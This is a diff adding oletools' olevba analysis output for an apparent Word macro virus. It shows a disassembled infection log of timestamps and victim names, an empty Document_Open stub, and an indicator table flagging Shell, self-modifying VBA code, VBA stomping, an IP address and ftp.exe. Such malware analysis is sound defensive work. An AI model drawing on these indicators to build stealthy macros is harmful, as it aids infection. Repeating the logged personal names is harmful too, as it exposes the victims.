+' Line #182:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #183:
+' Line #184:
+' Line #185:
+' Line #186:
+' 	QuoteRem 0x0000 0x0023 " 06:35:17 PM - Tuesday, 26 Jan 1999"
+' Line #187:
+' 	QuoteRem 0x0000 0x000F " lynn ann casey"
+' Line #188:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #189:
+' Line #190:
+' Line #191:
+' Line #192:
+' 	QuoteRem 0x0000 0x0023 " 10:10:39  - Wednesday, 27 Jan 1999"
+' Line #193:
+' 	QuoteRem 0x0000 0x000B " Jo Baldock"
+' Line #194:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #195:
+' Line #196:
+' Line #197:
+' Line #198:
+' 	QuoteRem 0x0000 0x0021 " 10:49:33 AM - Monday, 1 Feb 1999"
+' Line #199:
+' 	QuoteRem 0x0000 0x0012 " Richard P. Panico"
+' Line #200:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #201:
+' Line #202:
+' Line #203:
+' Line #204:
+' 	QuoteRem 0x0000 0x0024 " 05:11:22 PM - Wednesday, 3 Feb 1999"
+' Line #205:
+' 	QuoteRem 0x0000 0x0015 " Jennifer A. Johnsonj"
+' Line #206:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #207:
+' Line #208:
+' Line #209:
+' Line #210:
+' 	QuoteRem 0x0000 0x0020 " 02:03:10  - Tuesday, 9 Feb 1999"
+' Line #211:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #212:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #213:
+' Line #214:
+' Line #215:
+' Line #216:
+' 	QuoteRem 0x0000 0x0023 " 05:05:46  - Wednesday, 10 Feb 1999"
+' Line #217:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #218:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #219:
+' Line #220:
+' Line #221:
+' Line #222:
+' 	QuoteRem 0x0000 0x0022 " 02:04:06 PM - Monday, 22 Feb 1999"
+' Line #223:
+' 	QuoteRem 0x0000 0x000F " Sally Papworth"
+' Line #224:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #225:
+' Line #226:
+' Line #227:
+' Line #228:
+' 	QuoteRem 0x0000 0x0022 " 12:39:10 PM - Tuesday, 2 Mar 1999"
+' Line #229:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #230:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #231:
+' Line #232:
+' Line #233:
+' Line #234:
+' 	QuoteRem 0x0000 0x0022 " 06:58:41  - Wednesday, 3 Mar 1999"
+' Line #235:
+' 	QuoteRem 0x0000 0x000C " Sonja Mills"
+' Line #236:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #237:
+' Line #238:
+' Line #239:
+' Line #240:
+' 	QuoteRem 0x0000 0x0023 " 12:02:55 PM - Tuesday, 16 Mar 1999"
+' Line #241:
+' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
+' Line #242:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #243:
+' Line #244:
+' Line #245:
+' Line #246:
+' 	QuoteRem 0x0000 0x0025 " 04:44:14 PM - Wednesday, 24 Mar 1999"
+' Line #247:
+' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
+' Line #248:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #249:
+' Line #250:
+' Line #251:
+' Line #252:
+' 	QuoteRem 0x0000 0x0022 " 11:47:20 AM - Friday, 26 Mar 1999"
+' Line #253:
+' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
+' Line #254:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #255:
+' Line #256:
+' Line #257:
+' Line #258:
+' 	QuoteRem 0x0000 0x0023 " 07:42:40 PM - Tuesday, 20 Apr 1999"
+' Line #259:
+' 	QuoteRem 0x0000 0x0018 " RMIT University Library"
+' Line #260:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #261:
+' Line #262:
+' Line #263:
+' Line #264:
+' 	QuoteRem 0x0000 0x0020 " 12:19:56  - Friday, 23 Apr 1999"
+' Line #265:
+' 	QuoteRem 0x0000 0x0004 " Phi"
+' Line #266:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #267:
+' Line #268:
+' Line #269:
+' Line #270:
+' 	QuoteRem 0x0000 0x0024 " 10:13:02 PM - Wednesday, 5 May 1999"
+' Line #271:
+' 	QuoteRem 0x0000 0x0004 " ***"
+' Line #272:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #273:
+' Line #274:
+' Line #275:
+' Line #276:
+' 	QuoteRem 0x0000 0x0024 " 06:10:32 AM - Saturday, 29 May 1999"
+' Line #277:
+' 	QuoteRem 0x0000 0x000B " Huy Nguyen"
+' Line #278:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #279:
+' Line #280:
+' Line #281:
+' Line #282:
+' 	QuoteRem 0x0000 0x0022 " 07:45:25 PM - Monday, 31 May 1999"
+' Line #283:
+' 	QuoteRem 0x0000 0x000B " Huy Nguyen"
+' Line #284:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #285:
+' Line #286:
+' Line #287:
+' Line #288:
+' 	QuoteRem 0x0000 0x0023 " 03:18:50 pm - Thursday, 1 Jul 1999"
+' Line #289:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #290:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #291:
+' Line #292:
+' Line #293:
+' 	QuoteRem 0x0000 0x002D "VUT Loves Nicky F. Also! 23/07/99 12:43:05 pm"
+' Line #294:
+' Line #295:
+' Line #296:
+' 	QuoteRem 0x0000 0x002B "VUT Loves Nicky F. Also! 4/08/99 1:34:30 pm"
+' Line #297:
+' Line #298:
+' Line #299:
+' 	QuoteRem 0x0000 0x0041 "Building M Open Access Lab Loves Nicky F. Also! 24/08/99 14:03:32"
+' Line #300:
+' Line #301:
+' Line #302:
+' Line #303:
+' 	QuoteRem 0x0000 0x0020 " 11:23:46  - Friday, 27 Aug 1999"
+' Line #304:
+' 	QuoteRem 0x0000 0x001B " Building M Open Access Lab"
+' Line #305:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #306:
+' Line #307:
+' Line #308:
+' Line #309:
+' 	QuoteRem 0x0000 0x0024 " 05:20:07 pm - Thursday, 23 Sep 1999"
+' Line #310:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #311:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #312:
+' Line #313:
+' Line #314:
+' Line #315:
+' 	QuoteRem 0x0000 0x0022 " 10:17:28 am - Friday, 24 Sep 1999"
+' Line #316:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #317:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #318:
+' Line #319:
+' Line #320:
+' Line #321:
+' 	QuoteRem 0x0000 0x0021 " 01:56:08 pm - Friday, 1 Oct 1999"
+' Line #322:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #323:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #324:
+' Line #325:
+' Line #326:
+' Line #327:
+' 	QuoteRem 0x0000 0x0022 " 06:18:28 pm - Tuesday, 5 Oct 1999"
+' Line #328:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #329:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #330:
+' Line #331:
+' Line #332:
+' Line #333:
+' 	QuoteRem 0x0000 0x0024 " 12:27:53 pm - Wednesday, 6 Oct 1999"
+' Line #334:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #335:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #336:
+' Line #337:
+' Line #338:
+' Line #339:
+' 	QuoteRem 0x0000 0x0023 " 12:18:55 pm - Thursday, 7 Oct 1999"
+' Line #340:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #341:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #342:
+' Line #343:
+' Line #344:
+' Line #345:
+' 	QuoteRem 0x0000 0x0021 " 11:20:34 am - Monday, 8 Nov 1999"
+' Line #346:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #347:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #348:
+' Line #349:
+' Line #350:
+' Line #351:
+' 	QuoteRem 0x0000 0x0021 " 06:29:46 pm - Monday, 8 Nov 1999"
+' Line #352:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #353:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #354:
+' Line #355:
+' Line #356:
+' Line #357:
+' 	QuoteRem 0x0000 0x0023 " 01:37:00 am - Saturday, 1 Jan 2000"
+' Line #358:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #359:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #360:
+' Line #361:
+' Line #362:
+' Line #363:
+' 	QuoteRem 0x0000 0x0021 " 12:05:41  - Tuesday, 14 Dec 1999"
+' Line #364:
+' 	QuoteRem 0x0000 0x0004 " VUT"
+' Line #365:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #366:
+' Line #367:
+' Line #368:
+' Line #369:
+' 	QuoteRem 0x0000 0x0022 " 09:34:49  - Thursday, 23 Dec 1999"
+' Line #370:
+' 	QuoteRem 0x0000 0x0005 " WMIT"
+' Line #371:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #372:
+' Line #373:
+' Line #374:
+' Line #375:
+' 	QuoteRem 0x0000 0x0020 " 03:18:04  - Tuesday, 4 Jan 2000"
+' Line #376:
+' 	QuoteRem 0x0000 0x0009 " J Curson"
+' Line #377:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #378:
+' Line #379:
+' Line #380:
+' Line #381:
+' 	QuoteRem 0x0000 0x0021 " 12:01:25  - Tuesday, 18 Jan 2000"
+' Line #382:
+' 	QuoteRem 0x0000 0x000F " Sharon Pearson"
+' Line #383:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #384:
+' Line #385:
+' Line #386:
+' Line #387:
+' 	QuoteRem 0x0000 0x0023 " 08:19:24 AM - Tuesday, 25 Jan 2000"
+' Line #388:
+' 	QuoteRem 0x0000 0x0009 " Leah Lau"
+' Line #389:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #390:
+' Line #391:
+' Line #392:
+' Line #393:
+' 	QuoteRem 0x0000 0x0022 " 11:44:43 AM - Monday, 31 Jan 2000"
+' Line #394:
+' 	QuoteRem 0x0000 0x0009 " Leah Lau"
+' Line #395:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #396:
+' Line #397:
+' Line #398:
+' Line #399:
+' 	QuoteRem 0x0000 0x0025 " 03:20:47 PM - Wednesday, 16 Feb 2000"
+' Line #400:
+' 	QuoteRem 0x0000 0x0007 " McCoyR"
+' Line #401:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #402:
+' Line #403:
+' Line #404:
+' Line #405:
+' 	QuoteRem 0x0000 0x0023 " 12:10:05 PM - Tuesday, 29 Feb 2000"
+' Line #406:
+' 	QuoteRem 0x0000 0x000B " R.Cochrane"
+' Line #407:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #408:
+' Line #409:
+' Line #410:
+' Line #411:
+' 	QuoteRem 0x0000 0x0022 " 10:37:11 AM - Friday, 17 Mar 2000"
+' Line #412:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #413:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #414:
+' Line #415:
+' Line #416:
+' Line #417:
+' 	QuoteRem 0x0000 0x0020 " 11:54:16  - Sunday, 19 Mar 2000"
+' Line #418:
+' 	QuoteRem 0x0000 0x0013 " CHISHOLM INSTITUTE"
+' Line #419:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #420:
+' Line #421:
+' Line #422:
+' 	FuncDefn (Private Sub Document_Open())
+' Line #423:
+' Line #424:
+' 	EndSub 
+' Line #425:
+' Line #426:
+' 	QuoteRem 0x0000 0x0022 " 11:15:48 AM - Monday, 17 Jul 2000"
+' Line #427:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #428:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #429:
+' Line #430:
+' Line #431:
+' Line #432:
+' 	QuoteRem 0x0000 0x0022 " 12:43:46 PM - Monday, 17 Jul 2000"
+' Line #433:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #434:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #435:
+' Line #436:
+' Line #437:
+' Line #438:
+' 	QuoteRem 0x0000 0x0023 " 01:58:02 PM - Tuesday, 18 Jul 2000"
+' Line #439:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #440:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #441:
+' Line #442:
+' Line #443:
+' Line #444:
+' 	QuoteRem 0x0000 0x0023 " 03:18:46 PM - Tuesday, 18 Jul 2000"
+' Line #445:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #446:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #447:
+' Line #448:
+' Line #449:
+' Line #450:
+' 	QuoteRem 0x0000 0x0025 " 10:53:14 AM - Wednesday, 19 Jul 2000"
+' Line #451:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #452:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #453:
+' Line #454:
+' Line #455:
+' Line #456:
+' 	QuoteRem 0x0000 0x0025 " 05:10:42 PM - Wednesday, 19 Jul 2000"
+' Line #457:
+' 	QuoteRem 0x0000 0x0008 " default"
+' Line #458:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #459:
+' Line #460:
+' Line #461:
+' Line #462:
+' 	QuoteRem 0x0000 0x0024 " 11:48:10 AM - Thursday, 20 Jul 2000"
+' Line #463:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #464:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #465:
+' Line #466:
+' Line #467:
+' Line #468:
+' 	QuoteRem 0x0000 0x0024 " 01:18:27 PM - Thursday, 20 Jul 2000"
+' Line #469:
+' 	QuoteRem 0x0000 0x000F " Roxanne Clemie"
+' Line #470:
+' 	QuoteRem 0x0000 0x0013 " Chisholm Institute"
+' Line #471:
+' 	QuoteRem 0x0000 0x0012 " Events Management"
+' Line #472:
+' 	QuoteRem 0x0000 0x000C " PO Box 1281"
+' Line #473:
+' 	QuoteRem 0x0000 0x0010 " FRANKSTON  3199"
+' Line #474:
+' Line #475:
+' Line #476:
+' Line #477:
+' 	QuoteRem 0x0000 0x0024 " 02:41:59 PM - Thursday, 20 Jul 2000"
+' Line #478:
+' 	QuoteRem 0x0000 0x0008 " support"
+' Line #479:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #480:
+' Line #481:
+' Line #482:
+' Line #483:
+' 	QuoteRem 0x0000 0x0024 " 05:07:49 PM - Thursday, 27 Jul 2000"
+' Line #484:
+' 	QuoteRem 0x0000 0x0014 " Information Systems"
+' Line #485:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #486:
+' Line #487:
+' Line #488:
+' Line #489:
+' 	QuoteRem 0x0000 0x0029 " 09:15:44 <(¤¿¤)> - Wednesday, 7 Jun 2000"
+' Line #490:
+' 	QuoteRem 0x0000 0x0005 " Rose"
+' Line #491:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #492:
+' Line #493:
+' Line #494:
+' Line #495:
+' 	QuoteRem 0x0000 0x0020 " 02:09:39  - Friday, 11 Aug 2000"
+' Line #496:
+' 	QuoteRem 0x0000 0x0013 " Replication System"
+' Line #497:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #498:
+' Line #499:
+' Line #500:
+' 	QuoteRem 0x0000 0x0025 " 02:58:01 PM - Wednesday, 28 Feb 2001"
+' Line #501:
+' 	QuoteRem 0x0000 0x0009 " fs080298"
+' Line #502:
+' 	QuoteRem 0x0000 0x0015 " fs080298@hotmail.com"
+' Line #503:
+' Line #504:
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Close      |Runs when the Word document is closed        |
+|AutoExec  |Document_New        |Runs when a new Word document is created     |
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|put                 |May write to a file (if combined with Open)  |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Print #             |May write to a file (if combined with Open)  |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbHide              |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|command             |May run PowerShell commands                  |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|System              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |209.201.88.110      |IPv4 address                                 |
+|IOC       |ftp.exe             |Executable file name                         |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
